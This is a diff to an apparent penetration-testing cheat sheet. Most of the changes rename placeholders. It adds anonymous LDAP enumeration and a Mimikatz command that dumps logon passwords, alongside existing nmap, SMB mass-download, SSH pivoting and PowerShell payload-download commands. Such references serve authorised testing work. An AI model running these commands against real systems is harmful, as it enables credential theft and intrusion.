@@ -7,7 +7,7 @@
     > **SSH**: SSH with Clear Password
 
     ```pwsh
-    sshpass -p <Password> ssh <User>@<IP>
+    sshpass -p <PASSWORD> ssh <RUSER>@<RHOST>
     ```
 
 + ### Enumerating
@@ -15,13 +15,19 @@
     > **NMap**: Top Scan (Fast)
 
     ```pwsh
-    nmap -Pn -n -v -sV -sC <IP>
+    nmap -Pn -n -v -sV -sC <RHOST>
     ```
 
     > **NMap**: Full Scan with Firewall Protection (Slow)
 
     ```pwsh
-    nmap -sT -sU -sV -O -T4 -A -Pn --open --max-retries 3 --max-scan-delay 1s --defeat-rst-ratelimit --script-args unsafe=1 -oN <Output-Dir> <IP>
+    nmap -sT -sU -sV -O -T4 -A -Pn --open --max-retries 3 --max-scan-delay 1s --defeat-rst-ratelimit --script-args unsafe=1 -oN <LPATH> <RHOST>
+    ```
+
+    > **LDAP**: Full Enumerating
+
+    ```pwsh
+    ldapsearch -x -h <RHOST> -D '' -w '' -b "DC=domain,DC=local"
     ```
 
 + ### Remote Access
@@ -29,13 +35,13 @@
     > **Remote Desktop Connection**:
 
     ```pwsh
-    rdesktop 0.0.0.0 -r disk:share=/Local-Path
+    rdesktop <RHOST> -r disk:share=<RPATH>
     ```
 
     > **PowerShell Core**:
 
     ```pwsh
-    > New-PSSession -Credential (Get-Credential) -ComputerName 0.0.0.0 -Authentication Negotiate
+    > New-PSSession -Credential (Get-Credential) -ComputerName <RHOST> -Authentication Negotiate
     > Enter-PSSession 1
     ```
 
@@ -44,7 +50,7 @@
     > **SMBClient**: Download All Files
 
     ```pwsh
-    smbclient '\\0.0.0.0\Folder' -c 'prompt OFF;recurse ON;lcd '.';mget *' -U 'User'
+    smbclient '\\<RHOST>\<RPATH>' -c 'prompt OFF;recurse ON;lcd '.';mget *' -U 'User'
     ```
 
 + ### Compiling
@@ -66,7 +72,7 @@
     > **SCP**: Secure Copy with SSH
 
     ```pwsh
-    scp <Source-Path> <User>@<IP>:<destination-Path>
+    scp <LPATH> <RUSER>@<RHOST>:<RPATH>
     ```
 
 + ### Pivoting
@@ -76,13 +82,13 @@
     > **Note:** Server must have python 2.3 or higher.
 
     ```pwsh
-    sshuttle -r User@Remote-IP:Port Remote-Subnet/24
+    sshuttle -r <RUSER>@<RHOST>:<RPORT> <RSubnet>/24
     ```
 
     > Dynamic with SSH & ProxyChains
 
     ```pwsh
-    > ssh -D 12345 <User>@<IP> -p 22
+    > ssh -D 12345 <RUSER>@<RHOST> -p 22
     > export PROXYCHAINS_SOCKS5=12345
     > proxychains nmap -Pn -n -v -sV -sC <IP>
     ```
@@ -90,7 +96,7 @@
     > Static with SSH
 
     ```pwsh
-    ssh -g -L 12345:localhost:<Port> <IP>
+    ssh -g -L <LPORT>:localhost:<RPORT> <RHOST>
     ```
 
 + ### Password Cracking
@@ -158,15 +164,30 @@
     > Inside PowerShell
 
     ```pwsh
-    > Invoke-WebRequest -URI http://0.0.0.0/Path -OutFile File.exe
+    > Invoke-WebRequest -URI http://<LHOST>/<LPATH> -OutFile <FILE>
     ```
 
     > Inside Command Line
 
     ```pwsh
-    > powershell -Command "& { (New-Object Net.WebClient).DownloadFile('http://0.0.0.0/Path','File.exe') }"
-    > powershell -Command "Invoke-WebRequest -URI http://0.0.0.0/Path -OutFile File.exe"
+    > powershell -Command "& { (New-Object Net.WebClient).DownloadFile('http://<LHOST>/<LPATH>','<FILE>') }"
+    > powershell -Command "Invoke-WebRequest -URI http://<LHOST>/<LPATH> -OutFile <FILE>"
 
+    ```
+
++ ### Windows Enumeration
+
+    > Using Net.exe
+
+    ```pwsh
+    > net user
+    > net group
+    ```
+
+    > Using Mimikatz
+
+    ```pwsh
+    > mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
     ```
 
 + ### Add Local Administrator
